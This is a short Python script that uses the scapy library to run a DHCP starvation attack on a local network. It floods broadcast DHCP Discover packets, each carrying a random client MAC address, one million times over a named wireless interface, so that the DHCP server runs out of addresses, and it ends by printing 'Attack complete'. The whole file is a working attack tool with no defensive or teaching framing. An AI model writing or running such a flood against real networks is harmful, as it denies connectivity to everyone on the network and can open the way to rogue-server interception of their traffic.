from scapy.all import *
from scapy.layers.dhcp import *
from scapy.layers.inet import *

TARGET_MAC = "ff:ff:ff:ff:ff:ff"
TARGET_IP = "255.255.255.255"

conf.checkIPaddr = False


def create_dhcp_discover():
    dhcp_discover = Ether(dst=TARGET_MAC) /\
        IP(src="0.0.0.0", dst=TARGET_IP) /\
        UDP(sport=68, dport=67) /\
        BOOTP(op=1, chaddr=RandMAC()) /\
        DHCP(options=[("message-type", "discover"), "end"])
    return dhcp_discover

def dhcp_starvation(interface, count):
    for _ in range(count):
        packet = create_dhcp_discover()
        sendp(packet, iface=interface, verbose=False)
        print("Send DHCP Discover Packet")

if __name__ == "__main__":
    interface = "wifi"
    count = 1000000
    # print(f"starting DHCP Starvation on the interface {interface}")
    dhcp_starvation(interface, count)
    print("Attack complete")